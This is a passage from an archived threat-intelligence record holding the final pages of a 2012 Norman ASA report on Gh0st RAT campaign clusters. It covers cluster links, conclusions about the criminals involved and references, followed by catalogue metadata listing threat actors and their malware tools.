Gh0st and the c1bst clusters. It’s also worth noting that one of the\nC&C’s for the KrisR cluster is wo379733063.3322.org – only one digit different from this C&C,\nand corroborates the impression that the KrisR and cb1st clusters are connected.\n\n© N o r m a n A S A 2 0 1 2 P a g e  |  66\n\n\n-----\n\n#### Cluster: Xjjhj\n\nThe Xjjhj cluster contains 19 samples. It is linked with the Wangz, attac and QWPOT clusters.\n\n© N o r m a n A S A 2 0 1 2 P a g e  |  67\n\n\n-----\n\n### Conclusions\n\nThis study shows the presence of several logical links between different Ghost campaigns:\nLinks between malware type (in this case illustrated by the network protocol magic tag),\nlinks in the C&C infrastructure and to some extent links in the registration information.\n\nDue to the necessary scope limitation, many other links had to remain unexamined.\nHowever, the present work shows that some of the most active and prolific malware\ncampaigns share enough connections indicate that the same groups or individuals are\ninvolved.\n\nIn the cases where we have been able to say something about the entities responsible for\nthe attacks, it seems apparent that the persons involved can be considered career criminals.\nThese are people that have their hand in many different types of online crime, have been\ndoing it for quite some time, and often target victims inside China itself.\n\nSmaller clusters are in many ways more interesting. They are often more difficult to track, as\nthey obviously leave less clues as to who is behind the attack and what the purpose is.\nClusters that have been involved in targeted attacks typically belong to these.\n\n© N o r m a n A S A 2 0 1 2 P a g e  |  68\n\n\n-----\n\n### References\n\n1. Wikipedia. GhostNet. Wikipedia. [Online]\nhttp://en.wikipedia.org/wiki/GhostNet.\n\n2. Clean-MX. wt1888.com. Clean-MX domain search. [Online]\nhttp://support.clean-mx.de/clean-mx/viruses.php?domain=wt1888.com.\n\n3. Clean-MX. 81266966.com. Clean-MX domain search. [Online]\nhttp://support.clean-mx.de/clean-mx/viruses.php?domain=81266966.com.\n\n4. beishan.info. [Online]\nhttp://bbs.beishan.info/thread-849-1-1.html.\n\n5. cyberpolice.cn. _Nanchang Cyberpolice. [Online]_\nhttp://www.nanchang.cyberpolice.cn/show_news.asp?ID=1160.\n\n6. Blasco, Jaime. Targeted attacks against Tibet organizations. AlienVault Labs. [Online]\nhttp://labs.alienvault.com/labs/index.php/2012/targeted-attacks-against-tibet-organizations/.\n\n7. Villeneuve, Nart. The Significance of the “Nitro” Attacks. Trend Micro. [Online]\nhttp://blog.trendmicro.com/the-significance-of-the-nitro-attacks/.\n\n8. Command Five Pty Ltd. Command and Control in the Fifth Domain. [Online]\nhttp://www.commandfive.com/papers/C5_APT_C2InTheFifthDomain.pdf.\n\n9. University of Toronto. Recent Observations in Tibet-Related Information Operations: Advanced\nSocial Engineering for the Distribution of LURK Malware. Citizen Lab. [Online]\nhttps://citizenlab.org/wp-content/uploads/2012/07/10-2012-recentobservationsintibet.pdf.\n\n10. Walton, Greg. Tibetan journalists targeted by Gh0stRAT in Protest pictures.rar. MalwareLab.\n\n[Online]\nhttps://malwarelab.zendesk.com/entries/21199507-tibetan-journalists-targeted-by-gh0strat-inprotest-pictures-rar.\n\n11. Blasco, Jaime. New MaControl variant targeting Uyghur users, the Windows version using Gh0st\nRAT. AlienVault Labs. [Online]\nhttp://labs.alienvault.com/labs/index.php/2012/new-macontrol-variant-targeting-uyghur-users-thewindows-version-using-gh0st-rat/.\n\n12. Giuliani, Gianluca og Sharf, Elad. Nepalese government websites compromised to serve Zegost\nRAT . Websense Security Labs Blog. [Online]\nhttp://community.websense.com/blogs/securitylabs/archive/2012/08/08/nepalese-governmentwebsites-compromised-to-serve-zegost-backdoor.aspx.\n\n© N o r m a n A S A 2 0 1 2 P a g e  |  69\n\n\n-----\n\n© N o r m a n A S A 2 0 1 2 P a g e  |  70\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "d63ae2b7-445f-460d-965d-2676dacdb6de",
            "created_at": "2022-10-25T15:59:19.552139Z",
            "updated_at": "2022-10-25T15:59:19.552139Z",
            "deleted_at": null,
            "name": "APTnotes",
            "url": "https://github.com/aptnotes/data",
            "description": "APTnotes data",
            "reports": null
        },
        {
            "id": "5d2b9e7f-cf43-4b54-ba18-065aa3003611",
            "created_at": "2022-10-25T16:06:24.199525Z",
            "updated_at": "2022-10-25T16:06:24.199525Z",
            "deleted_at": null,
            "name": "CyberMonitor",
            "url": "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections",
            "description": "APT & Cybercriminals Campaign Collection",
            "reports": null
        }
    ],
    "references": [
        "https://app.box.com/s/aj7ebr1v0x9mf3psmxeififqijwmmacy",
        "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections/raw/master/2011/2011.11.15.Many_Faces_Gh0st_Rat/Faces_Ghost_RAT.pdf"
    ],
    "report_names": [
        "Faces_Ghost_RAT"
    ],
    "threat_actors": [
        {
            "id": "3cc6c262-df23-4075-a93f-b496e8908eb2",
            "created_at": "2022-10-25T16:07:23.682239Z",
            "updated_at": "2025-03-27T02:02:09.920109Z",
            "deleted_at": null,
            "main_name": "GhostNet",
            "aliases": [
                "GhostNet",
                "Snooping Dragon"
            ],
            "source_name": "ETDA:GhostNet",
            "tools": [
                "AngryRebel",
                "Farfli",
                "Gh0st RAT",
                "Gh0stnet",
                "Ghost RAT",
                "Ghostnet",
                "Moudour",
                "Mydoor",
                "PCRat",
                "Remosh",
                "TOM-Skype"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "dcba8e2b-93e0-4d6e-a15f-5c44faebc3b1",
            "created_at": "2022-10-25T16:07:23.816991Z",
            "updated_at": "2025-03-27T02:02:09.991944Z",
            "deleted_at": null,
            "main_name": "Lurk",
            "aliases": [],
            "source_name": "ETDA:Lurk",
            "tools": [],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "e91dae30-a513-4fb1-aace-4457466313b3",
            "created_at": "2023-01-06T13:46:38.974913Z",
            "updated_at": "2025-03-27T02:00:02.967085Z",
            "deleted_at": null,
            "main_name": "GhostNet",
            "aliases": [
                "Snooping Dragon"
            ],
            "source_name": "MISPGALAXY:GhostNet",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "9041c438-4bc0-4863-b89c-a32bba33903c",
            "created_at": "2023-01-06T13:46:38.232751Z",
            "updated_at": "2025-03-27T02:00:02.778714Z",
            "deleted_at": null,
            "main_name": "Nitro",
            "aliases": [
                "Covert Grove"
            ],
            "source_name": "MISPGALAXY:Nitro",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "a2b44a04-a080-4465-973d-976ce53777de",
            "created_at": "2022-10-25T16:07:23.911791Z",
            "updated_at": "2025-03-27T02:02:10.025108Z",
            "deleted_at": null,
            "main_name": "Nitro",
            "aliases": [
                "Covert Grove",
                "Nitro"
            ],
            "source_name": "ETDA:Nitro",
            "tools": [
                "AngryRebel",
                "Backdoor.Apocalipto",
                "Chymine",
                "Darkmoon",
                "Farfli",
                "Gen:Trojan.Heur.PT",
                "Gh0st RAT",
                "Ghost RAT",
                "Moudour",
                "Mydoor",
                "PCClient",
                "PCRat",
                "Poison Ivy",
                "SPIVY",
                "Spindest",
                "pivy",
                "poisonivy"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1666716504,
    "ts_updated_at": 1743041484,
    "ts_creation_date": 1345125601,
    "ts_modification_date": 1345125693,
    "files": {
        "pdf": "https://archive.orkl.eu/02e2959da1d4522c2d94ffbc7a1871470b2f7912.pdf",
        "text": "https://archive.orkl.eu/02e2959da1d4522c2d94ffbc7a1871470b2f7912.txt",
        "img": "https://archive.orkl.eu/02e2959da1d4522c2d94ffbc7a1871470b2f7912.jpg"
    }
}